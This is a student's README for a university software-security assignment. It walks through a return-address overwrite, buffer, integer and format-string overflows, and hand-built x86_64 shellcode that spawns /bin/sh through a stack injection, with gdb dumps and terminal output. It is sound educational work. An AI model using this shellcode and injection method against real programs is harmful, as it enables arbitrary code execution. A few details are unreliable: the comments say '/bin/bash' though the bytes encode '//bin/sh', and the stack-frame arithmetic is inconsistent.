# Description
This repository contains the files with the solutions for the third assignment of the subjetc Software Quality (University of Murcia).


## Exercise 1: Skip instruction

Steps:
 - Compile original source code (`TestA1.c`) with the following command: `gcc TestA1.c -o Test.out -fno-stack-protector -z execstack -O0`.
 - Disassemble both `main` and `function` procedures using `gdb disassemble` command.
    - Identify the `x = 'b'` instruction (`movb   $0x62,-0x1(%rbp)` in `main`) and the stack frame size (`mov    %esi,-0x28(%rbp)`). We can see that, in order to skip the intruction, we need to increase the return address by 4. On the other hand, by looking at the %rbp offset we can see that the stack frame size is 40 bytes (0x28 + 0x4 = 0x30).
 - Modify the function to skip the instruction.

This is the dissasemble output:
```
jorge@jorge:~/Escritorio/git/Calso$ gdb Test.out
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
Para las instrucciones de informe de errores, vea:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Leyendo símbolos desde Test.out...(no se encontraron símbolos de depuración)hecho.
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000000675 <+0>:	push   %rbp
   0x0000000000000676 <+1>:	mov    %rsp,%rbp
   0x0000000000000679 <+4>:	sub    $0x10,%rsp
   0x000000000000067d <+8>:	movb   $0x61,-0x1(%rbp)
   0x0000000000000681 <+12>:	lea    0xe0(%rip),%rdi        # 0x768
   0x0000000000000688 <+19>:	callq  0x550 <puts@plt>
   0x000000000000068d <+24>:	lea    0xdc(%rip),%rdi        # 0x770
   0x0000000000000694 <+31>:	callq  0x550 <puts@plt>
   0x0000000000000699 <+36>:	mov    $0x3,%edx
   0x000000000000069e <+41>:	mov    $0x2,%esi
   0x00000000000006a3 <+46>:	mov    $0x1,%edi
   0x00000000000006a8 <+51>:	callq  0x665 <function>
   0x00000000000006ad <+56>:	movb   $0x62,-0x1(%rbp)
   0x00000000000006b1 <+60>:	lea    0xd7(%rip),%rdi        # 0x78f
   0x00000000000006b8 <+67>:	mov    $0x0,%eax
   0x00000000000006bd <+72>:	callq  0x560 <printf@plt>
   0x00000000000006c2 <+77>:	movsbl -0x1(%rbp),%eax
   0x00000000000006c6 <+81>:	mov    %eax,%esi
   0x00000000000006c8 <+83>:	lea    0xc9(%rip),%rdi        # 0x798
   0x00000000000006cf <+90>:	mov    $0x0,%eax
   0x00000000000006d4 <+95>:	callq  0x560 <printf@plt>
   0x00000000000006d9 <+100>:	mov    $0x0,%eax
   0x00000000000006de <+105>:	leaveq
   0x00000000000006df <+106>:	retq
End of assembler dump.
(gdb) disassemble function
Dump of assembler code for function function:
   0x0000000000000665 <+0>:	push   %rbp
   0x0000000000000666 <+1>:	mov    %rsp,%rbp
   0x0000000000000669 <+4>:	mov    %edi,-0x24(%rbp)
   0x000000000000066c <+7>:	mov    %esi,-0x28(%rbp)
   0x000000000000066f <+10>:	mov    %edx,-0x2c(%rbp)
   0x0000000000000672 <+13>:	nop
   0x0000000000000673 <+14>:	pop    %rbp
   0x0000000000000674 <+15>:	retq
End of assembler dump.
```

And the execution of the modified program:

```
jorge@jorge:~/Escritorio/git/Calso$ gcc TestA1_sol.c -o Test.out -fno-stack-protector -z execstack -O0; ./Test.out
Hello
I am going to skip a statement
The following value must be the a letter: a
```


## Exercise 2a: Random Stack & Heap addresses

In order to check if the OS assigns random stack & heap addresses, we can execute the program `Adress.c` multiple times. Example:

```
jorge@jorge:~/Escritorio/git/Calso$ gcc Address.c; ./a.out
Heap Address: 0x7fff3c88de10  Stack Address: 0x7fff3c88de0c
jorge@jorge:~/Escritorio/git/Calso$ gcc Address.c; ./a.out
Heap Address: 0x7ffd2ca2ee60  Stack Address: 0x7ffd2ca2ee5c
jorge@jorge:~/Escritorio/git/Calso$ gcc Address.c; ./a.out
Heap Address: 0x7ffdd4c2f080  Stack Address: 0x7ffdd4c2f07c
jorge@jorge:~/Escritorio/git/Calso$ gcc Address.c; ./a.out
Heap Address: 0x7ffdf3b6f450  Stack Address: 0x7ffdf3b6f44c
```

Therefore, we can state the OS of my computer assigns random addresses.

## Exercise 2b: Buffer overflow

In order to produce a buffer overflow, we just need to provide more than 10 characters (length of `password` array). Example:

```
jorge@jorge:~/Escritorio/git/Calso$ gcc BufOverStack.c; ./a.out mipasmipasmipas
*** stack smashing detected ***: <unknown> terminated
Abortado (`core' generado)
```

## Exercise 2c: Integer overflow

In order to produce an integer overflow, we just need to provide values higher than INT_MAX (2147483647). Example:

```
jorge@jorge:~/Escritorio/git/Calso$ gcc IntOver.c; ./a.out
First integer: 2147483648
Second integer: 2147483647
The multiplication is -2147483648
End.
1
```

## Exercise 2d: String vulnerability

In this case, the `printf` function is called without a const string format. Therefore, we could provide a format instead of a plain string. Example:

```
jorge@jorge:~/Escritorio/git/Calso$ gcc FormatStr.c; ./a.out
FormatStr.c: In function ‘main’:
FormatStr.c:11:12: warning: format not a string literal and no format arguments [-Wformat-security]
   11 |     printf(cad);
      |            ^~~
What is your address?: %p
Your address is: 0x5568555988cf
```


## Exercise 2e: Shellcode


In this exercise, we have to execute a shellcode by changing the return address of a function call. To do this, first, we need the shellcode.
We have prepared this super simple piece of code (file `shellcode.c`):

```c
#include <stdio.h>

void main() {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

We can compile and execute it:
```
jorge@jorge:~/Escritorio/git/Calso$ gcc shellcode.c -fno-stack-protector -z execstack -O0 -static; ./a.out
shellcode.c: In function ‘main’:
shellcode.c:7:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
    7 |     execve(name[0], name, NULL);
      |     ^~~~~~
$ ls
Address.c  BufOverStack.c  FormatStr.c	IntOver.c  README.md  Test.out	TestA1.c  TestA1_sol.c	a.out  shell.asm  shell.o  shellcode.c	shellcodeasm.c
```

The next step is to disassemble the code:

```
...
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000400bed <+0>:	push   %rbp
   0x0000000000400bee <+1>:	mov    %rsp,%rbp
   0x0000000000400bf1 <+4>:	sub    $0x10,%rsp
   0x0000000000400bf5 <+8>:	lea    0x90fa8(%rip),%rax        # 0x491ba4
   0x0000000000400bfc <+15>:	mov    %rax,-0x10(%rbp)
   0x0000000000400c00 <+19>:	movq   $0x0,-0x8(%rbp)
   0x0000000000400c08 <+27>:	mov    -0x10(%rbp),%rax
   0x0000000000400c0c <+31>:	lea    -0x10(%rbp),%rcx
   0x0000000000400c10 <+35>:	mov    $0x0,%edx
   0x0000000000400c15 <+40>:	mov    %rcx,%rsi
   0x0000000000400c18 <+43>:	mov    %rax,%rdi
   0x0000000000400c1b <+46>:	callq  0x448370 <execve>
   0x0000000000400c20 <+51>:	nop
   0x0000000000400c21 <+52>:	leaveq
   0x0000000000400c22 <+53>:	retq
End of assembler dump.
(gdb) disassemble __execve
Dump of assembler code for function execve:
   0x0000000000448370 <+0>:	mov    $0x3b,%eax
   0x0000000000448375 <+5>:	syscall
   0x0000000000448377 <+7>:	cmp    $0xfffffffffffff001,%rax
   0x000000000044837d <+13>:	jae    0x448380 <execve+16>
   0x000000000044837f <+15>:	retq
   0x0000000000448380 <+16>:	mov    $0xffffffffffffffc0,%rcx
   0x0000000000448387 <+23>:	neg    %eax
   0x0000000000448389 <+25>:	mov    %eax,%fs:(%rcx)
   0x000000000044838c <+28>:	or     $0xffffffffffffffff,%rax
   0x0000000000448390 <+32>:	retq
End of assembler dump.
```

Now, we are going to implement a similar program but using ASM language directly.

The department of Computer Science of Florida State University (FSU) has a [good tutorial](https://www.cs.fsu.edu/~langley/CNT5605/2017-Summer/assembly-example/assembly.html) for x86_64 syscalls.

These are the keypoints to execute a syscall:
 - EAX must contain the system call number (execve = 0x3b as we saw previously: `mov    $0x3b,%eax`).
 - RDI must contain the first argument ("/bin/bash").
 - RSI must contain the second argument (NULL).

In order to simplify the code as much as possible, the string "/bin/bash" has been directly pushed into the stack (`mov     rdi, 0x68732f2f6e69622f` and `push    rdi`), instead of using a global string (`lea    0x90fa8(%rip),%rax` and `mov    %rax,%rdi`)

```asm
global _start
section .text

_start:
    mov     rsi, 0x0                 ; arg[1] = NULL
    push    rsi                      ; push arg2
    mov     rdi, 0x68732f2f6e69622f  ; arg[0] = /bin/bash => 2f 62 69 6e 2f 62 61 73 68, so we set it in reverse     order
    push    rdi                      ; push arg[0]
    mov     rdi, rsp                 ; arg[0] = STACK_BUFFER
    mov     eax, 59                  ; 59 is execve syscall (0x3b)
    cdq                              ; double size of EAX
    syscall                          ; perform the syscall
```


We can compile and execute it:
```
jorge@jorge:~/Escritorio/git/Calso$ nasm -felf64 shell.asm && ld shell.o -o a.out; ./a.out
$ ls
Address.c  BufOverStack.c  FormatStr.c	IntOver.c  README.md  Test.out	TestA1.c  TestA1_sol.c	a.out  shell.asm  shell.o  shellcode.c	shellcodeasm.c
$
```

The next step is to obtain the hexdump of the ASM code. We can use gdb to do this:

```
jorge@jorge:~/Escritorio/git/Calso$ gdb a.out
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1

...

(gdb) disassemble _start
Dump of assembler code for function _start:
   0x0000000000400080 <+0>:	mov    $0x0,%esi
   0x0000000000400085 <+5>:	push   %rsi
   0x0000000000400086 <+6>:	movabs $0x68732f2f6e69622f,%rdi
   0x0000000000400090 <+16>:	push   %rdi
   0x0000000000400091 <+17>:	mov    %rsp,%rdi
   0x0000000000400094 <+20>:	mov    $0x3b,%eax
   0x0000000000400099 <+25>:	cltd
   0x000000000040009a <+26>:	syscall
End of assembler dump.
(gdb) x/bx _start
0x400080 <_start>:	0xbe
(gdb)
0x400081 <_start+1>:	0x00
(gdb)
0x400082 <_start+2>:	0x00

...
```

We can copy the hexdump into a C char array:

```c
unsigned char code[]= "\xbe\x00\x00\x00\x00\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb8\x3b\x00\x00\x00\x99\x0f\x05";
```

The last step is very easy. We just need to replace the return address of a function call by the address of this array. We can reuse the code of the first exercise (file `shellcodeasm.c`).

Again, let's compile and execute it:

```
jorge@jorge:~/Escritorio/git/Calso$ gcc shellcodeasm.c -fno-stack-protector -z execstack -O0 -static; ./a.out
Hello
I am going to skip a statement
$ ls
Address.c  BufOverStack.c  FormatStr.c	IntOver.c  README.md  Test.out	TestA1.c  TestA1_sol.c	a.out  shell.asm  shell.o  shellcode.c	shellcodeasm.c
$
```
